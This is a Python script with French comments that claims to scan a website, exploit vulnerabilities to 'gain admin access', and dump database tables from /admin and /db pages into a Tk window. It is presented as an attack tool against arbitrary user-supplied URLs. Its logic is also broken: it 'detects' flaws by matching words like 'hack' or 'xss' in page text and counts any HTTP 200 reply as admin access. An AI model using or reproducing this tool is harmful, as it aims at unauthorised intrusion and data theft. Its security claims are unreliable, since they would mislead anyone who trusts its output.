import requests
import re
from bs4 import BeautifulSoup
from tkinter import *
import threading

# Fonction pour scanner une URL et rechercher des vulnérabilités
def scan_url(url):
    try:
        # afficher un message indiquant le début du scan
        print("\033[91mScanning URL for vulnerabilities...\033[0m")
        # obtenir le code source de la page web
        source_code = requests.get(url)
        plain_text = source_code.text
        soup = BeautifulSoup(plain_text, 'html.parser')
        # trouver tous les liens contenus dans la page web
        for link in soup.findAll('a', {'href': re.compile('^http')}):
            href = link.get('href')
            # créer un thread pour chaque lien et rechercher des vulnérabilités dans le code source de chaque page
            thread = threading.Thread(target=check_vulnerability, args=(href,))
            thread.start()
    except:
        # afficher un message d'erreur si l'URL n'est pas valide
        print("\033[91mURL not found. Please enter a valid URL\033[0m")

# Fonction pour vérifier si une page web contient des vulnérabilités
def check_vulnerability(url):
    # obtenir le code source de la page web
    page_source = requests.get(url)
    page_text = page_source.text
    # rechercher des mots-clés associés à des vulnérabilités dans le code source
    check_vuln = re.findall('[Vv]ulnerability|[Xx]ss|[Hh]ack', page_text)
    # afficher un message si une vulnérabilité est détectée
    if check_vuln:
        print(f"\033[91mVulnerability found at {url}\033[0m")
        # lancer l'exploitation de la vulnérabilité
        exploit_vuln(url)

# Fonction pour exploiter une vulnérabilité et obtenir un accès administrateur
def exploit_vuln(url):
    try:
        # afficher un message indiquant le début de l'exploitation
        print("\033[92mExploiting vulnerability to gain admin access...\033[0m")
        # obtenir le code source de la page d'administration
        admin_page = requests.get(url + "/admin")
        admin_text = admin_page.text
        admin_soup = BeautifulSoup(admin_text, 'html.parser')
        admin_form = admin_soup.find('form')
        admin_inputs = admin_form.find_all('input')
        # créer un dictionnaire avec les champs et valeurs du formulaire
        fields = {}
        for input in admin_inputs:
            input_name = input.get('name')
            input_value = input.get('value')
            if input_name and input_value:
                fields[input_name] = input_value
        # soumettre les données du formulaire et obtenir un accès administrateur
        admin_data = requests.post(url + "/admin", data=fields)
        if admin_data.status_code == 200:
            print("\033[92mSuccess! Admin access granted.\033[0m")
            # lancer la récupération des informations de la base de données
            get_db_info(url)
        else:
            print("\033[91mFailed to gain admin access.\033[0m")
    except:
        print("\033[91mExploit failed.\033[0m")

# Fonction pour récupérer les informations de la base de données
def get_db_info(url):
    try:
        # afficher un message indiquant le début de la récupération des informations
        print("\033[93mRetrieving database information...\033[0m")
        # obtenir le code source de la page de base de données
        db_page = requests.get(url + "/db")
        db_text = db_page.text
        db_soup = BeautifulSoup(db_text, 'html.parser')
        db_tables = db_soup.find_all('table')
        db_rows = []
        for table in db_tables:
            rows = table.find_all('tr')
            for row in rows:
                db_rows.append(row.text)
        # afficher un message indiquant la fin de la récupération des informations
        print("\033[93mDatabase information retrieved.\033[0m")
        # afficher une interface utilisateur pour afficher les informations récupérées
        show_gui(db_rows)
    except:
        print("\033[91mDatabase info could not be retrieved.\033[0m")

# Fonction pour afficher une interface utilisateur avec les informations de la base de données
def show_gui(db_rows):
    root = Tk()
    root.title("Database Information")
    root.geometry("600x400")
    db_list = Listbox(root)
    for row in db_rows:
        db_list.insert(END, row)
    db_list.pack()
    root.mainloop()

url = input("Please enter a URL: ")
scan_url(url)
